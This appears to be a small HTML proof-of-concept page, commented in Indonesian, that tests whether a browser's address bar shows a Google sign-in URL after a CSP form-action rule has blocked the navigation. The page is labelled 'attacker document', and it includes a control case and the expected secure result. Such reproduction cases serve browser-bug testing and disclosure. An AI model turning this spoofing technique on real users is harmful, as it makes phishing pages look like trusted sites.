<!doctype html><meta charset=utf-8>
<meta http-equiv="Content-Security-Policy" content="form-action 'none'">
<!-- PREDIKAT: bar/label melukis www.google.com sementara dokumen tetap milikku
     ORACLE: klik go -> screenshot bar + panel REAL; console mencatat pelanggaran CSP = bukti nav dibunuh LOKAL
     CONTROL: hapus <meta ...Content-Security-Policy...> -> nav commit normal
     EXPECTED-SECURE: bar tak pernah melukis target yang navigasinya diblok kebijakan -->
<h2>attacker document (tetap terlihat)</h2>
<form id=f method=GET target=_self></form>
<button onclick="go()">go</button>
<pre id=p></pre>
<script>
const T = 'https://www.google.com/accounts/' + 'signin/'.repeat(40) + 'identifier';
f.action = T;
let n = 0;
function go(){ if (n++ < 6) f.submit(); paint(); }
function paint(){ p.textContent = 'REAL: ' + location.href + '\nattempts: ' + n + '\nCSP form-action = pembunuh nav'; }
addEventListener('securitypolicyviolation', e => { p.textContent += '\nCSP blocked: ' + e.violatedDirective; });
paint();
</script>
